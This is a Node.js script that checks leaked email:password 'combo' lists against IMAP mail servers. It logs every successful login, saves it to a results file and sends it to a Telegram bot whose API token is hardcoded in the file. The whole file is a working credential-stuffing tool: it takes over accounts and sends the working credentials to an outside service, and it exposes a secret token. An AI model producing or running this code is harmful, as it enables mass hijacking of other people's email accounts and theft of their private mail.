process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix

// dependencies
const imaps = require('imap-simple');
const fs = require('fs');
const cliProgress = require('cli-progress');
const TelegramBot = require('node-telegram-bot-api');
var configs = require('./imaps.json');
const stream = fs.createWriteStream("results.txt");
const progressBar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);

// telegram bot username @ChichkeBot
const botToken = '1015158198:AAE8d8TzPix7J5vPa9jr0wAsiJjdjocZiOY';
const bot = new TelegramBot(botToken, { polling: true });

// global vars
var host;
var port;
var tls;
var max = 0;
var counter = 0;
var found = 0;
var id;
var log = 'Nothing!'

setupBot = () => {

    bot.onText(/\/status/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, 'Current progress is ' + counter + ' / ' + max);
        bot.sendMessage(id, 'Found ' + found + ' working combo...');
    });

    bot.onText(/\/log/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, log);
    });
}

connect = async (username, password) => {
    var config = {
        imap: {
            user: username,
            password: password,
            host: host,
            port: port,
            tls: tls,
            authTimeout: 10000
        }
    };

    await imaps.connect(config)
        .then(function (connection) {
            found++;
            const successMsg = '~~ ACCOUNT FOUND ~~ MAIL: ' + username + ' ~~ PASS: ' + password + '~~\n'
            writeResult(successMsg);
            console.log(successMsg)
            bot.sendMessage(id, successMsg)
                .catch(err => log = error);
        }).catch(error => {
            log = error.toString();
        });
}

parser = (line) => {
    for (conf in configs)
        for (index in configs[conf].tag)
            if (line.includes(configs[conf].tag[index])) {
                port = configs[conf].port;
                host = configs[conf].host;
                tls = configs[conf].tls;
                return;
            }
    port = -1;
}

writeResult = (result) => {
    stream.once('open', function (fd) {
        stream.write(result);
        stream.end();
    });
}

main = async () => {
    var array = fs.readFileSync('./combo.txt').toString().split("\r\n");
    for (line in array)
        for (conf in configs)
            for (index in configs[conf].tag)
                if (array[line].includes(configs[conf].tag[index])) {
                    max++;
                }

    progressBar.start(max, counter);
    for (line in array) {
        progressBar.update(counter);
        parser(array[line]);
        if (port !== -1)
            await connect(array[line].slice(0, array[line].indexOf(':')), array[line].slice(array[line].indexOf(':') + 1, array[line].length));
        counter++
    }
}

setupBot();
main();